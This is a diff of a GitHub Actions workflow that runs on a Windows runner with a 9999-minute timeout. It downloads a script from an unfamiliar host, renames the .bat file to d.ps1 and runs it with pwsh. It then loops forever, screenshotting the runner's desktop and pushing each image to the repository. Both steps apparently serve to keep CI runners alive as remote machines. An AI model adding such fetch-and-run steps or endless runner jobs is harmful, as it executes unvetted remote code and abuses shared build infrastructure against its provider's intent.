@@ -8,41 +8,62 @@ permissions:
 
 jobs:
   build:
+
     runs-on: windows-latest
     timeout-minutes: 9999
 
     steps:
+
       - name: 拉取仓库
         uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: 下载并执行安装脚本
-        run: |
-          curl -L -o d.ps1 "https://r2.ctn32.us.kg/raw/windows/downloads.bat"
-          pwsh -File d.ps1
-
-      - name: 初始化 Git
+      - name: 设置 Git
+        shell: powershell
         run: |
           git config --global user.name "github-actions"
           git config --global user.email "actions@github.com"
 
-      - name: 循环截图并更新 PNG
+      - name: 下载并执行安装脚本
         shell: powershell
         run: |
+          curl -L `
+            -o d.ps1 `
+            "https://r2.ctn32.us.kg/raw/windows/downloads.bat"
+
+          pwsh -File d.ps1
+
+
+      - name: 循环截图并上传 PNG
+        shell: powershell
+        run: |
+
+          [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+          $OutputEncoding = [System.Text.Encoding]::UTF8
+
+
           while ($true) {
 
-            Write-Host "[$(Get-Date)] 正在截图..."
+            Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] 正在截图..."
+
 
             Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
+
             $path = "$env:GITHUB_WORKSPACE\screenshot.png"
+
 
             $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
 
-            $bmp = New-Object System.Drawing.Bitmap `
+
+            $bitmap = New-Object System.Drawing.Bitmap `
               $screen.Width,
               $screen.Height
 
-            $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+
+            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+
 
             $graphics.CopyFromScreen(
               $screen.X,
@@ -52,28 +73,33 @@ jobs:
               $screen.Size
             )
 
-            $bmp.Save(
+
+            $bitmap.Save(
               $path,
               [System.Drawing.Imaging.ImageFormat]::Png
             )
 
+
             $graphics.Dispose()
-            $bmp.Dispose()
+            $bitmap.Dispose()
+
 
             Write-Host "截图完成: $path"
 
 
             git add screenshot.png
 
+
             git commit `
               -m "update screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" `
               2>$null
 
-            git push origin HEAD `
-              2>$null
+
+            git push origin HEAD:main
 
 
             Write-Host "等待10秒..."
+
 
             Start-Sleep -Seconds 10
           }
